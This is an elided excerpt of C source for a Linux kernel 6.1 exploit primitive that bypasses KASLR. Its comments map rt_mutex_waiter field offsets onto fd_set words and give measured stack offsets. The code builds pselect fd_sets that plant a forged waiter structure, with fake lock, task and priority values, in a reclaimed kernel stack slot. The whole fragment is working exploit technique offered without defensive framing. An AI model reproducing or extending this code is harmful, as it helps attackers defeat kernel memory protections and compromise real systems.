...
/*
 * slide61.c — 6.1 kernel variant of the KASLR-bypass (slide) primitive.
 *
 * 6.1 rt_mutex_waiter is FLAT (one shared prio/deadline), unlike the nested
 * rt_waiter_node layout of 6.6. Since fd_set word N lands at byte offset
 * N*8 of the reclaimed kernel stack slot, the word indices must match the
 * 6.1 field offsets (see target.h WAITER_* / FAKE_WAITER_*).
 *
 * 6.1 flat rt_mutex_waiter:
 *   0x00 tree_entry.__rb_parent_color   word 0
 *   0x08 tree_entry.rb_right            word 1
 *   0x10 tree_entry.rb_left             word 2
 *   0x18 pi_tree_entry.__rb_parent_color word 3
 *   0x20 pi_tree_entry.rb_right         word 4
 *   0x28 pi_tree_entry.rb_left          word 5
 *   0x30 task                           word 6
 *   0x38 lock                           word 7
 *   0x40 wake_state(u32)                word 8 (low 4 bytes)
 *   0x44 prio(i32)                      word 8 (high 4 bytes)
 *   0x48 deadline(u64)                  word 9
 *   0x50 ww_ctx                         word 10
 */
...
/*
 * Stack delta measured on tegu (6.1): futex chain 0x70+0x60+0x1b0, waiter at
 * S0-0x1e8; pselect chain 0x90+0x1c0, stack_fds at S0-0x200. Waiter starts
 * 3 words above stack_fds word 0, so shift the word map up by 3.
 */
...
void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  ...
  /*
   * 6.1 flat rt_mutex_waiter (see header comment). tree_entry rb_node
   * {tree_pc,0,boot_id}; pi_tree_entry rb_node {tree_pc,0,boot_id} at 0x18;
   * task/lock/wake|prio/deadline/ww at 0x30/0x38/0x40/0x48/0x50.
   */
  struct slide_waiter_word {
    ...
    {3, SLIDE_LOGGERS_0_1, "pi_pc"},
    {4, 0, "pi_right"},
    {5, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
    {6, SLIDE_INIT_TASK, "task"},
    {7, fake_lock, "lock"},
    {8, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_state|prio"},
    {9, 0, "deadline"},
    {10, 0, "ww_ctx"},
  };
